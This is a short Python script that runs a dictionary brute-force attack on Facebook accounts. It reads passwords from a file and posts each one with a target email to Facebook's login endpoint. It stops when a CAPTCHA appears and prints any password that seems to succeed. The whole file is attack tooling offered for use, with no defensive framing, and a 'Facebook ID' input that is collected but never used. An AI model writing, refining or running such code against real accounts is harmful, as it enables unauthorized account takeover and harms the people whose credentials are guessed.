import requests

# Function to perform brute force attack without proxy
def brute_force(username, fb_id, passwords):
    for password in passwords:
        try:
            # Example: Make a request to Facebook login without using a proxy
            result = requests.post('https://www.facebook.com/login.php',
                                   data={'email': username, 'pass': password},
                                   timeout=10)

            # Check if CAPTCHA is triggered
            if 'captcha' in result.text.lower():
                print("CAPTCHA triggered. Aborting brute-force.")
                break

            # Check if login was successful (customize based on Facebook's response)
            if 'Welcome to Facebook' in result.text:
                print(f"Login successful! Username: {username}, Password: {password}")
                break
            else:
                print(f"Login failed for Password: {password}")

        except requests.exceptions.RequestException as e:
            print(f"Request Error: {e}")
            # Handle specific errors if needed

# Function to read passwords from a file
def read_passwords(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()

# Function to execute the main brute-force attack
def main():
    username = input("Enter email address (as username): ")
    fb_id = input("Enter Facebook ID: ")
    password_file = input("Enter the password file name: ")

    # Read passwords from file
    passwords = read_passwords(password_file)

    # Perform brute-force attack
    brute_force(username, fb_id, passwords)

if __name__ == '__main__':
    main()
